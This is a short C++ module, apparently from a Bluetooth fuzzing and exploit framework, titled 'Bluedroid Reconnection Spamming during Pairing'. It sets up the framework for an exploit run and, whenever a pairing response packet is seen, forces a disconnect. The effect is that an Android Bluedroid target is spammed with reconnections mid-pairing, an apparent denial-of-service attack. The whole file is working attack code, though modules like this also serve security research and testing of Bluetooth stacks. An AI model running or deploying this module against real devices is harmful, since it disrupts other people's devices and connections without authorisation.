#include "ModulesInclude.hpp"

// Filters

// Vars

// Setup
const char *module_name()
{
    return "Bluedroid Reconnection Spamming during Pairing";
}


int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.packet_retry = false;
    config->bluetooth.randomize_own_bt_address = false;

    return 0;
}


// TX
int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if(packet_has_condition("btsmp.opcode == 0x02")){
        m_disconnect(p);
    }
    return 0;
}
